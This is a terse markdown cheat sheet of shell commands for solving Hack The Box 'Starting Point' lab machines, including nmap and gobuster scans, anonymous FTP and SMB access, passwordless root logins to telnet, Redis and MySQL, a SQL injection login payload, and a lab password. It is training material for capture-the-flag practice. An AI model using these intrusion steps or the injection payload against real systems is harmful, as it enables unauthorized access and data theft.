# starting point machines

## Meow

```shell
sudo namp -sN -A <ip_address> -v
telnet <ip_address>
username: root
cat flag.txt
```

## Fawn

```shell
sudo nmap -sN -A <ip_address> -v
ftp <ip_address>
username: anonymous
get flag.txt
exit
cat flag.txt
```

## Dancing

```shell
sudo nmap -sN -A <ip_address> -v
sudo nmap -A <ip_address> -
smbclient -L <ip_address>
smbclient //<ip_address>/WorkShares
cd James.P
get flag.txt
```

## Redeemer

```shell
sudo nmap -A -p1-9000 <ip_address>
sudo apt-get install redis -y
redis-cli -h 10.129.107.1
info
select 0
keys *
get flag
```

## Appointment

```shell
sudo nmap -sN -A <ip_address>
gobuster dir --wordlist /usr/share/wordlists/dirbuster/directory-list-1.0.txt --url <ip_address>
# Web Login Credentials
# username: admin'#
```

## Sequel 

```shell
sudo nmap -sN -A <ip_address>
mysql --user=root --host=<ip_address> --port=3306
show databases;
use htb;
select * From config;
```

## Crocodile

```shell
sudo nmap -sN -A <ip_address>
ftp 10.129.107.34 
# Username: anonymous
get allowed.userlist
# useername: admin
get allowed.userlist.passwd
# password: rKXM59ESxesUFHAd
gobuster dir --wordlist /usr/share/wordlists/dirbuster/directory-list-1.0.txt --url <ip_address>
# find login.php
<ip_address>/login.php
# username: admin
# password: rKXM59ESxesUFHAd
```

## Responder

```shell

```